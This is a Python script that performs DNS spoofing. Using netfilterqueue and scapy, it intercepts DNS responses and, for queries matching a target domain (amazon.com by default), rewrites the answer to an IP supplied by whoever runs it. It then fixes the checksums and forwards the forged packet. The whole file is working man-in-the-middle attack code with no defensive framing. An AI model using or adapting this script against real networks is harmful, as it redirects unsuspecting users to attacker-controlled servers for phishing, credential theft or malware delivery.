#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re
import time
import os

from termcolor import colored

def verify(IP):
    # 192.168.100.1
    ip_match = re.match(r'^([0-9]{1,3}\.){3}[0-9]{1,3}$', IP)

    return ip_match

def process_packet(IP, domain, packet):

    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.DNSRR):

        qname = scapy_packet[scapy.DNSQR].qname
        qname_dec = qname.decode()

        if domain in qname_dec:
            print(colored(f"[+] Spoofing domain {qname_dec}", "yellow"))

            try:
                answer = scapy.DNSRR(rrname=qname, rdata=IP)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(scapy_packet.build())
            except:
                pass

    packet.accept()

def main(IP, domain='amazon.com'):

    isCorrect = verify(IP)

    time.sleep(2)

    if isCorrect:
        print(colored("[+] Capturing DNSRR...\n", "green"))

        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, lambda pkt: process_packet(IP, domain, pkt))
        queue.run()
    else:
        print(colored("\n[!] Format of server IP incorrect.\n"))
        os._exit(1)
